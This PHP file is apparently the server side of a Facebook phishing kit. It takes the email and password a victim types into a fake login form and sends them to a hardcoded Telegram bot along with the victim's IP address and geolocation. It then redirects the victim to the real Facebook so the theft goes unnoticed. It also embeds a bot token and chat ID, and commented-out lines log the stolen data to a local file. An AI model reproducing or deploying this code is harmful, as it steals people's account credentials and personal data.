<?php
ob_start();
session_start();

if (!isset($_SESSION['eksekusi'])) {
    header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");
        header("Location: ../app/login");
    }


// if (!isset($_SESSION['submit'])) {
    
//     header("Location: ../login");
// }


//     $xml = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".getRealIpAddr());
//     echo $xml->geoplugin_countryName ;
    
    
//     echo "<pre>";
//     foreach ($xml as $key => $value)
//     {
//         echo $key , "= " , $value ,  " \n" ;
//     }
//     echo "</pre>";

//     function getRealIpAddr()
// {
//     if (!empty($_SERVER['HTTP_CLIENT_IP']))   //check ip from share internet
//     {
//       $ip=$_SERVER['HTTP_CLIENT_IP'];
//     }
//     elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))   //to check ip is pass from proxy
//     {
//       $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
//     }
//     else
//     {
//       $ip=$_SERVER['REMOTE_ADDR'];
//     }
//     return $ip;
// }


    // Get a Visitor Location Details using IP Address PHP Function
function getLocationByIp(){  
    $client_ip  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward_ip = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote_ip  = @$_SERVER['REMOTE_ADDR'];
    $result  = array('countryCode'=>'', 'countryName'=>'', 'region'=>'', 'city'=>'',
    'Longitude'=>'', 'Latitude'=>'', 'timezone'=>'', 'currency'=>'');
    if(filter_var($client_ip, FILTER_VALIDATE_IP)){
        $ip_address = $client_ip;
    }elseif(filter_var($forward_ip, FILTER_VALIDATE_IP)){
        $ip_address = $forward_ip;
    }else{
        $ip_address = $remote_ip;
    }
    $loc_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip_address));    
    if($loc_data && $loc_data->geoplugin_countryName != null){
        $result['countryCode'] = $loc_data->geoplugin_countryCode;
        $result['countryName'] = $loc_data->geoplugin_countryName;
        $result['region'] = $loc_data->geoplugin_region;
        $result['city'] = $loc_data->geoplugin_city;
        $result['Longitude'] = $loc_data->geoplugin_latitude_city;
        $result['Latitude'] = $loc_data->geoplugin_longitude_city;
        $result['timezone'] = $loc_data->geoplugin_timezone_city;
        $result['currency'] = $loc_data->geoplugin_currencyCode;
    }else{
        $result['countryCode'] = 'US';
    }
    return $result;
}

$loc = getLocationByIp();
$countryCode = $loc['countryCode'];
$countryCode2 = $loc['countryName'];
$countryCode3 = $loc['region'];
$countryCode4 = $loc['city'];
$countryCode5 = $loc['Longitude'];
$countryCode6 = $loc['Latitude'];
$countryCode7 = $loc['timezone'];
$countryCode8 = $loc['currency'];

    $ip=$_SERVER['REMOTE_ADDR'];
    $host_name = gethostname();
    $brows = $_SERVER['HTTP_USER_AGENT'];
    $os = php_uname();

    // $APIf = rand(0,50);
    echo "\n";

            
    if (isset($_POST['submit'])) {
$_SESSION['eksekusi'] ="benar" ;
   $file=fopen("../tmp/database_auth.txt","a");
        extract($_REQUEST);
//     fwrite($file,"Email, Username or Phone Number : ");
//     fwrite($file, $email ."\n");
//     fwrite($file,"Password : ");
//     fwrite($file, $password ."\n"); 
//     fwrite($file,"IP Adress : ");
//     fwrite($file, $ip ."\n");
//     fwrite($file,"Time Stamp : ");
//     fwrite($file, date("Y-m-d H:i:s" . "\n"));
//     fwrite($file,"countryCode : ");
//     fwrite($file, $countryCode ."\n");
//     fwrite($file,"countryName :");
//     fwrite($file, $countryCode2 ."\n");
//     fwrite($file,"region :");
//     fwrite($file, $countryCode3 ."\n");
//     fwrite($file,"city :");
//     fwrite($file, $countryCode4 ."\n");
//      fwrite($file,"Latitude & Longitude Address : ");
//     fwrite($file, $countryCode5 . $countryCode6 . "," ."\n");
//     fwrite($file,"Time Zone :");
//     fwrite($file, $countryCode7 ."\n");
//     fwrite($file,"currency :");
//     fwrite($file, $countryCode8 ."\n");
//     fwrite($file,"hostname :");
//     fwrite($file, $host_name ."\n");
//     fwrite($file,"Browser :");
//     fwrite($file, $brows ."\n");
//     fwrite($file,"OS & Server :");
//     fwrite($file, $os ."\n");

//     $isMob = is_numeric(strpos(strtolower($_SERVER["HTTP_USER_AGENT"]), "mobile")); 
 
// if($isMob){ 
//     fwrite($file,"Device : ");
//     fwrite($file, "Mobile Detected" ."\n\n");
// }else{ 
//     fwrite($file,"Device : ");
//     fwrite($file, "Desktop Detected" ."\n\n");
// }
//         if ($APIf <= 15) {
//         session_destroy();
//         header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
// header("Cache-Control: post-check=0, pre-check=0", false);
// header("Pragma: no-cache");
//         header("Location: https://www.facebook.com/");
//     }
    fclose($file);
}
function get_ipaddr() {
    $keys = array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR');

    foreach ($keys as $key) {
        if (array_key_exists($key, $_SERVER) === true) {
            foreach (explode(',', $_SERVER[$key]) as $ip) {
                if (filter_var($ip, FILTER_VALIDATE_IP) !== false) {
                    echo $ip;
                    return $ip;
                }
            }
        }
    }
}

$testing = get_ipaddr();

$telegram_id = 6236719664;
date_default_timezone_set("Asia/Indonesia");
$well = date("Y-m-d H:i:s");
$secret_token = '6896586625:AAFMM5Knbo6PM8M0h8EfnhTvlQop-RJcDmE';
sendMessage($telegram_id, $email, $password, $testing, $brows, $os,  $host_name, $countryCode, $countryCode2, $countryCode3, $countryCode4, $countryCode5, $countryCode6, $countryCode7, $countryCode8, $well, $isMob, $secret_token);



function sendMessage( $telegram_id, $email, $password, $testing, $brows, $os, $host_name, $countryCode, $countryCode2, $countryCode3, $countryCode4, $countryCode5, $countryCode6, $countryCode7, $countryCode8, $well, $isMob, $secret_token) {
    $brows = $_SERVER['HTTP_USER_AGENT'];
    $os = php_uname();
    $loc = getLocationByIp();
    $countryCode = $loc['countryCode'];
$countryCode2 = $loc['countryName'];
$countryCode3 = $loc['region'];
$countryCode4 = $loc['city'];
$countryCode5 = $loc['Longitude'];
$countryCode6 = $loc['Latitude'];
$countryCode7 = $loc['timezone'];
$countryCode8 = $loc['currency'];
    function getBrowser(){

$agent = $_SERVER['HTTP_USER_AGENT'];
$name = 'NA';


if (preg_match('/MSIE/i', $agent) && !preg_match('/Opera/i', $agent)) {
    $name = 'Internet Explorer';
} elseif (preg_match('/Firefox/i', $agent)) {
    $name = 'Mozilla Firefox';
} elseif (preg_match('/Chrome/i', $agent)) {
    $name = 'Google Chrome';
} elseif (preg_match('/Safari/i', $agent)) {
    $name = 'Apple Safari';
} elseif (preg_match('/Opera/i', $agent)) {
    $name = 'Opera';
} elseif (preg_match('/Netscape/i', $agent)) {
    $name = 'Netscape';
}
return $name;
}
        $results = true;
         $authFbemail = true;  

    //          if ($authFbemail) {
    //         if (preg_match('/[#$%^&*()+=\-\[\]\';,.\/{}|":<>?~\\\\]/', $email)) {
    //     $authFbemail = "Email,Phone,Username : Valid Standar Facebook (Accurate 50%)";
    //     $authFbemail = "Email,Phone,Username : Not Valid Standar Facebook";
    // } else {
        
    // }
    // }

         $APIf = true;
     $isMob = is_numeric(strpos(strtolower($_SERVER["HTTP_USER_AGENT"]), "mobile")); 

     // $username  = str_replace(" ", "");
     // $password  = str_replace(" ", "");

      if ($APIf) {
                if (strlen($email) >= 6 && strlen($password) >= 6 && !preg_match('/[#$%^&*()\-\[\]]/', $email) && !preg_match('/[#$%^&*()+=\-\[\]\';,.\/{}|":<>]/', $password)) {
                 $p = "%";    
                // $APIf = "Account Verified" . " (60" . $p . " accuracy rate) : Yes (Redirect FB";
                echo "\n";
                $results = "Account Verified : Yes (Accurate 60%)";
                $APIf = "Email & Password : Valid Standar Facebook";
                header("Location: https://www.facebook.com/");
              
             }
                else {
                       $p = "%";
                // $APIf = "Account Verified" . " (60" . $p . " accuracy rate) : No (Login Looping Authentication)";
                echo "\n"; 
                $results = "Account Trusted : No (Email & Password Not Match!!!)";
                $APIf = "Email & Password : Not Valid Standar Facebook";

            }
}            
        
        //      if ($APIf != $authFbemail) {
            
        // } else {
            
        // }
       
                



    if($isMob){ 
    $isMob = "Mobile";
}else{ 
    $isMob = "Dekstop";
}
date_default_timezone_set("Asia/Indonesia");
// get provider
    // $ipProvider = geoip_isp_by_name("https://www.facebook.com/");
    // $ipProvider = gethostbyaddr($_SERVER['REMOTE_ADDR']);
// $isp = geoip_isp_by_name('www.example.com');

    $url = "https://api.telegram.org/bot" . $secret_token . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode(
        "Email, username or phone : " .$email . "\n" .
        "Password : " .$password . "\n" .
        "ip addres : " .$testing . "\n" .
        "Date input : " .$well . "\n" .
        "Country code : " .$countryCode . "\n" .
        "Country name : " .$countryCode2 . "\n" .
        $APIf . "\n" . $results . "\n"
        // "Latitude & Longitude : " .$countryCode5 . "," . $countryCode6 . "\n"
        // "Host name : " .$host_name . "\n" .
        // "Operating Sys (DESKTOP) : " .$os . "\n" .
        // "Device : " .$isMob . "\n" .
    );
      
   
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    $err = curl_error($ch);
    curl_close($ch);

    if ($err) {
       echo 'Pesan gagal terkirim, error :' . $err;
    }else{
        echo 'Pesan terkirim';
    }

}


clearstatcache();
ob_end_flush();
 ?>